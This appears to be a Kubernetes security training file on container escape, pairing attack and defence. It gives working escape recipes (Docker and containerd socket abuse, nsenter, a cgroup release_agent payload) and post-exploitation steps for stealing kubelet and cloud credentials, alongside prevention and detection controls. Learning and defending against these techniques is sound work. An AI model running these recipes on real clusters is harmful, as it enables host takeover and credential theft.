# Container Escape

## 1. Overview

Container escape is the transition from code running inside a container to code running on the host (or in another container with higher privileges). It is the highest-impact outcome of a Kubernetes compromise because the host gives access to every other container on the node, the kubelet credentials, and often the cloud instance role.

Escapes fall into five classes:

- **Configuration escapes** - the container was started with privileges that already grant host access (privileged, hostPath, host namespaces, runtime socket).
- **Kernel escapes** - the container exploits a kernel or runtime vulnerability to break the namespace isolation.
- **Runtime escapes** - the container talks to the container runtime (Docker, containerd, CRI-O) and asks it to start a privileged container on the host.
- **Cloud escapes** - the container uses the cloud metadata service to obtain node credentials, then pivots to the cloud control plane.
- **Orchestrator escapes** - the container abuses the kubelet API or the API server to run a privileged Pod on the node.

The last two are covered in `04 GKE and EKS Attack Paths.md`. This file covers the first three.

## 2. Reconnaissance and Enumeration

Run these checks first inside any compromised container.

Identity and capabilities:

```bash
id
cat /proc/self/status | grep -E 'CapEff|CapPrm|CapBnd'
capsh --print 2>/dev/null
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root)
CapEff: 0000003fffffffff
```

A `CapEff` of `0000003fffffffff` (all capabilities) on a non-privileged container is already a red flag; on a privileged container it is expected.

Container markers:

```bash
cat /proc/1/cgroup
ls -la /.dockerenv 2>/dev/null
mount | grep -E 'overlay|docker|containerd'
```

Expected output:

```text
0::/kubepods/burstable/pod1234/abc
-rw-r--r-- 1 root root 0 Jan 1 00:00 /.dockerenv
overlay on / type overlay (rw,relatime)
```

Mounted host paths and sockets:

```bash
mount | grep -E 'host|/var/run|/proc|/sys'
ls -la /var/run/docker.sock /run/containerd/containerd.sock /var/run/crio/crio.sock 2>/dev/null
```

Expected output:

```text
/dev/sda1 on /host type ext4 (rw,relatime)
srw-rw---- 1 root docker 0 Jan 1 00:00 /var/run/docker.sock
```

Namespace sharing:

```bash
ls -la /proc/1/ns/
readlink /proc/1/ns/pid /proc/1/ns/net /proc/1/ns/mnt
```

Expected output:

```text
pid -> pid:[4026531836]
net -> net:[4026531840]
mnt -> mnt:[4026531841]
```

If `/proc/1/ns/pid` points to the same namespace as the host's PID 1, `hostPID: true` is set. If `/proc/1/ns/net` matches the node's network namespace, `hostNetwork: true` is set.

Cloud metadata reachability:

```bash
curl -s -m 2 http://169.254.169.254/latest/meta-data/ || echo "blocked"
```

## 3. Common Attack Vectors

**3.1 Privileged container**

`securityContext.privileged: true` disables almost all isolation: the container gets all capabilities, access to all devices, and the ability to mount the host filesystem. Escape is trivial (see Recipe 1).

**3.2 hostPath mount**

A hostPath volume of `/`, `/etc`, `/var/lib/kubelet`, `/var/lib/docker`, or `/var/lib/containerd` gives read or write access to host files. Write access to `/etc/cron.d`, `/etc/systemd/system`, or `/root/.ssh/authorized_keys` is a direct host compromise.

**3.3 host namespaces**

- `hostPID: true` - the container can see and signal every process on the node. `nsenter` into PID 1 gives host root.
- `hostNetwork: true` - the container shares the node's network stack; it can bind to any port, sniff node traffic, and reach the kubelet on `localhost:10250`.
- `hostIPC: true` - shared memory with host processes, useful for some kernel exploits.

**3.4 Container runtime socket**

A mounted `/var/run/docker.sock`, `/run/containerd/containerd.sock`, or `/var/run/crio/crio.sock` lets the container ask the runtime to start a new container with `--privileged --pid=host --net=host -v /:/host`. This is a full host escape without any kernel exploit.

**3.5 Kernel vulnerabilities**

- CVE-2022-0847 (Dirty Pipe) - overwrite read-only files in the page cache; affects kernels 5.8 through 5.16.11.
- CVE-2021-3493 (overlayfs) - Ubuntu-specific overlayfs privilege escalation.
- CVE-2021-22555 - netfilter heap out-of-bounds write, kernel 2.6.19 to 5.12.
- CVE-2022-0185 - fs_context heap overflow, kernel 5.4 to 5.16.

Kernel exploits are version-specific; check `uname -r` first.

**3.6 Runtime vulnerabilities**

- CVE-2019-5736 (runc) - overwrite the host runc binary from inside a container.
- CVE-2021-30465 (runc) - symlink exchange in `runc run`.
- CVE-2020-15257 (containerd) - abstract Unix socket allows a container to reach the host containerd shim.

**3.7 cgroup release_agent**

On cgroups v1 with a privileged container or with `CAP_SYS_ADMIN`, the `release_agent` file can be used to execute a binary on the host when a cgroup is emptied. Classic escape, still works on older kernels with cgroups v1.

**3.8 Docker/containerd API**

If the runtime socket is reachable over TCP (rare but seen), the Docker API on 2375 (unauthenticated) or 2376 (TLS) allows the same operations as the socket.

## 4. Exploitation Recipes

**Recipe 1 - privileged container to host root:**

```bash
# Inside a privileged container with a hostPath of / mounted at /host
mkdir -p /host/tmp/escape
chroot /host /bin/bash
```

Expected output:

```text
root@node-1:/#
```

**Recipe 2 - hostPID + nsenter:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

Expected output:

```text
root@node-1:/#
```

**Recipe 3 - Docker socket escape:**

```bash
docker -H unix:///var/run/docker.sock run --rm -it --privileged --pid=host --net=host -v /:/host alpine chroot /host /bin/bash
```

Expected output:

```text
root@node-1:/#
```

**Recipe 4 - containerd socket escape (ctr):**

```bash
ctr -a /run/containerd/containerd.sock -n k8s.io run --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/alpine:latest escape /bin/sh
```

Expected output:

```text
/ # chroot /host /bin/bash
root@node-1:/#
```

**Recipe 5 - cgroup release_agent (cgroups v1, privileged):**

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$HOST_PATH/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\nid > /tmp/pwned\n' > /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/pwned
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Recipe 6 - Dirty Pipe (CVE-2022-0847) check:**

```bash
uname -r
# If kernel is between 5.8 and 5.16.11 (inclusive), Dirty Pipe is applicable
```

Expected output:

```text
5.10.0-11-amd64
```

## 5. Post-Exploitation

After reaching the host:

- Read `/var/lib/kubelet/kubeconfig` or `/etc/kubernetes/kubelet.conf` for kubelet credentials.
- Read `/etc/kubernetes/admin.conf` on control-plane nodes for cluster-admin.
- Read `/var/lib/etcd` on control-plane nodes if etcd is not encrypted at rest.
- Read the instance metadata (`http://169.254.169.254/`) for the node's cloud role; assume it with `aws sts assume-role`, `gcloud auth`, or `az login`.
- Access other containers on the node via the runtime socket (`docker ps`, `crictl ps`).
- Pivot to other nodes via the kubelet API (10250) using the kubelet's client certificate.
- Create a DaemonSet via the stolen cluster-admin kubeconfig to persist on every node.

## 6. Preventive Controls

- Never run privileged containers in multi-tenant clusters. PSA `restricted` blocks them.
- Never mount the container runtime socket into a Pod. If a Pod needs to build images, use a dedicated builder node or Kaniko/Buildah without the socket.
- Never mount hostPath `/`, `/etc`, `/var/lib/kubelet`, `/var/lib/docker`, `/var/lib/containerd`, `/proc`, `/sys`.
- Disable `hostPID`, `hostNetwork`, `hostIPC` unless strictly required (CNI, logging, monitoring DaemonSets).
- Enforce `allowPrivilegeEscalation: false`, `runAsNonRoot: true`, `readOnlyRootFilesystem: true`, drop all capabilities.
- Use gVisor (GKE Sandbox), Kata Containers, or Firecracker for untrusted workloads.
- Keep the kernel and container runtime patched; track runc, containerd, and CRI-O CVEs.
- Use SELinux or AppArmor profiles to constrain container access to host resources.

## 7. Detection Controls

Runtime signals:

- Container process accessing `/proc/1/ns/*`, `/proc/1/root`, or `/host`.
- Container process executing `nsenter`, `chroot`, `unshare`, `mount`.
- Container process opening `/var/run/docker.sock`, `/run/containerd/containerd.sock`, `/run/crio/crio.sock`.
- Container process writing to `/etc/cron.d`, `/etc/systemd/system`, `/root/.ssh/`.
- Container process reading `/var/lib/kubelet/kubeconfig` or `/etc/kubernetes/admin.conf`.

Falco rules:

- `Container Escape via nsenter`
- `Container Escape via chroot`
- `Privileged Container Started`
- `Docker Socket Mounted`
- `Read Sensitive File Untrusted`

eBPF and Tetragon:

- Trace `execve` of `nsenter`, `chroot`, `unshare`, `docker`, `ctr`, `crictl` from within a container.
- Trace `open` on runtime sockets.

Kernel and runtime:

- Audit `cap_capable` calls for `CAP_SYS_ADMIN` from container processes.
- Alert on new privileged containers via the audit log (`create pods` with `privileged: true`).

## 8. Verification

- Run `kube-bench` and confirm the control-plane and node checks pass.
- Attempt to start a privileged Pod as a non-admin; PSA should reject.
- Attempt to mount `hostPath: /var/run/docker.sock`; Gatekeeper/Kyverno should deny.
- Attempt `nsenter` from a Pod without `hostPID`; it should fail with `Operation not permitted`.
- Check kernel version against the Dirty Pipe, Dirty COW, and overlayfs CVE lists; patch if vulnerable.
- Check runc and containerd versions against CVE-2019-5736, CVE-2021-30465, CVE-2020-15257.

## 9. Cloud-Specific Considerations

- EKS nodes run Amazon Linux 2 or Bottlerocket; Bottlerocket disables SSH and the Docker socket by default, reducing escape surface.
- GKE nodes can run Container-Optimized OS (COS) or Ubuntu; COS has a read-only root filesystem and no package manager.
- GKE Autopilot enforces gVisor for some workload classes, which blocks most container escapes.
- AKS nodes run Ubuntu or Mariner; Azure Linux (Mariner) is the hardened default for new node pools.
- On all three, IMDS reachability from Pods is a separate escape path (see `04 GKE and EKS Attack Paths.md`).

## 10. Production Notes

- Container escape is rare when PSA `restricted` is enforced and the runtime is patched. It is common when privileged Pods, hostPath, or host namespaces are allowed.
- The runtime socket is the single most dangerous mount. Audit every Pod spec for `/var/run/docker.sock`, `/run/containerd/containerd.sock`, `/run/crio/crio.sock`.
- Kernel exploits are version-specific; a node pool with mixed kernel versions has mixed exposure. Pin the kernel version in the node bootstrap template.
- gVisor reduces the kernel attack surface but adds compatibility constraints (no raw sockets, no `io_uring`). Test workloads before enabling cluster-wide.
- After an escape, rotate the node's instance role credentials immediately; assume they are compromised.

## 11. References

- Kubernetes Pod Security Standards - https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Kubernetes hostPath volumes - https://kubernetes.io/docs/concepts/storage/volumes/#hostpath
- CVE-2022-0847 Dirty Pipe - https://nvd.nist.gov/vuln/detail/CVE-2022-0847
- CVE-2019-5736 runc - https://nvd.nist.gov/vuln/detail/CVE-2019-5736
- CVE-2021-30465 runc - https://nvd.nist.gov/vuln/detail/CVE-2021-30465
- CVE-2020-15257 containerd - https://nvd.nist.gov/vuln/detail/CVE-2020-15257
- CVE-2021-22555 netfilter - https://nvd.nist.gov/vuln/detail/CVE-2021-22555
- CVE-2022-0185 fs_context - https://nvd.nist.gov/vuln/detail/CVE-2022-0185
- CVE-2021-3493 overlayfs - https://nvd.nist.gov/vuln/detail/CVE-2021-3493
- cgroup release_agent escape (Unit 42) - https://unit42.paloaltonetworks.com/cgroups/
- Falco rules - https://github.com/falcosecurity/rules
- Tetragon - https://github.com/cilium/tetragon

## Certification Alignment

- CKS (Certified Kubernetes Security Specialist) - system hardening, microservice vulnerabilities, cluster hardening.
- CKA (Certified Kubernetes Administrator) - node configuration, container runtime, troubleshooting.
- CompTIA Security+ - host hardening, vulnerability management.
- AWS Certified Security - Specialty - EC2 instance role, IMDS.
- Google Cloud Professional Cloud Security Engineer - GKE Sandbox, node hardening.
- Azure Security Engineer Associate - AKS node hardening, Azure Linux.
